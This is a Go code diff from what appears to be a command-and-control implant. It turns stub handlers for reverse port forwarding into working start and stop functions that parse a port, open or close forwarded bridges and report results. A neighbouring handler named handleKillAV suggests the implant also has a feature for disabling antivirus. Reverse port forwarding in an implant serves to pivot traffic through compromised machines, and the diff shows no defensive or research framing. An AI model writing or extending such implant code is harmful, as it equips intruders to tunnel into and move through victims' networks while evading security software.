@@ -217,13 +217,35 @@ func handleRPortFwdStart(task Task, res *TaskResult) {
 		res.Error = "format: lport|forwardHost:forwardPort"
 		return
 	}
-	lport := parts[0]
-	target := parts[1]
-	res.Output = fmt.Sprintf("rportfwd start: listening on :%s -> %s", lport, target)
+	lport, err := strconv.Atoi(strings.TrimSpace(parts[0]))
+	if err != nil {
+		res.Error = "invalid lport: " + parts[0]
+		return
+	}
+	addr, err := startRPortForward(lport, strings.TrimSpace(parts[1]))
+	if err != nil {
+		res.Error = err.Error()
+		return
+	}
+	res.Output = fmt.Sprintf("rportfwd listening on %s -> %s", addr, parts[1])
 }
 
 func handleRPortFwdStop(task Task, res *TaskResult) {
-	res.Output = "rportfwd stop requested"
+	lport, err := strconv.Atoi(strings.TrimSpace(task.Command))
+	if err != nil {
+		res.Error = "usage: rportfwd_stop <lport>"
+		return
+	}
+	activeConns, err := stopRPortForward(lport)
+	if err != nil {
+		res.Error = err.Error()
+		return
+	}
+	if activeConns > 0 {
+		res.Output = fmt.Sprintf("rportfwd on :%d stopped (%d active bridge(s) closed)", lport, activeConns)
+	} else {
+		res.Output = fmt.Sprintf("rportfwd on :%d stopped", lport)
+	}
 }
 
 func handleKillAV(task Task, res *TaskResult) {
